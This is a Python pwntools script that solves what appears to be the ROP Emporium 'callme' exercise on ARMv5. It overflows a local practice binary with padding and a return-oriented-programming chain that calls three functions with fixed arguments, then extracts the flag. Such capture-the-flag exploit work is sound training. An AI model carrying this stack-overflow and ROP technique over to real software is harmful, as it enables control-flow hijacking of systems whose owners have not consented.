from pwn import *

context.arch = "arm"
context.log_level = "critical"

bin = "./callme_armv5"
p = process(bin)

multiMovGadget = 0x000108b0 # mov r2, sb; mov r1, r8; mov r0, r7; blx r3
multiPopGadget = 0x000108c8 # {r4, r5, r6, r7, r8, sb, sl, pc}
popR3 = 0x000105dc # r3 pc

callme_one = 0x00010618
callme_two = 0x0001066c
callme_three = 0x0001060c

rop = ROP(p.elf)

rop.raw(b"i"*36)
rop.raw(p32(popR3))
rop.raw(p32(callme_one))
rop.raw(p32(multiPopGadget))
rop.raw(p32(0x0)) # r4
rop.raw(p32(0x0)) # r5
rop.raw(p32(0x0)) # r6
rop.raw(p32(0xdeadbeef)) # r7
rop.raw(p32(0xcafebabe)) # r8
rop.raw(p32(0xd00df00d)) # sb
rop.raw(p32(0x0)) # sl
rop.raw(p32(multiMovGadget)) # pc

rop.raw(p32(0x0)) # r4
rop.raw(p32(0x0)) # r5
rop.raw(p32(0x0)) # r6
rop.raw(p32(0xdeadbeef)) # r7
rop.raw(p32(0xcafebabe)) # r8
rop.raw(p32(0xd00df00d)) # sb
rop.raw(p32(0x0)) # sl
rop.raw(p32(popR3)) # pc
rop.raw(p32(callme_two))
rop.raw(p32(multiMovGadget))

rop.raw(p32(0x0)) # r4
rop.raw(p32(0x0)) # r5
rop.raw(p32(0x0)) # r6
rop.raw(p32(0xdeadbeef)) # r7
rop.raw(p32(0xcafebabe)) # r8
rop.raw(p32(0xd00df00d)) # sb
rop.raw(p32(0x0)) # sl
rop.raw(p32(popR3)) # pc
rop.raw(p32(callme_three))
rop.raw(p32(multiMovGadget))

p.recvuntil("> ")
p.sendline(rop.chain())

print(re.search(b"ROPE{(.+?)}", p.recvall(timeout=1)).group(0))
